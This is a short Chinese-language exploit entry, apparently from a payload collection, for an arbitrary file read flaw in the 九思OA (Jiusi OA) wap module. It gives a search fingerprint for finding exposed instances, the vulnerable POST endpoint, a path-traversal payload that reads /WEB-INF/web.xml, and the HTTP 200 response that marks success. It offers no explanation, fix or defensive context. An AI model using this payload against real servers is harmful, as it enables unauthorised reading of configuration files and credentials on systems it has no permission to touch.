# 九思OAwap任意文件读取漏洞

九思OAwap ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/jsoa/login.jsp"`
- **请求**：`POST /jsoa/wap.do?method=downLoad HTTP/1.1`

**Payload**
```
path=../&name=&FileName=/WEB-INF/web.xml
```
- **响应特征**：200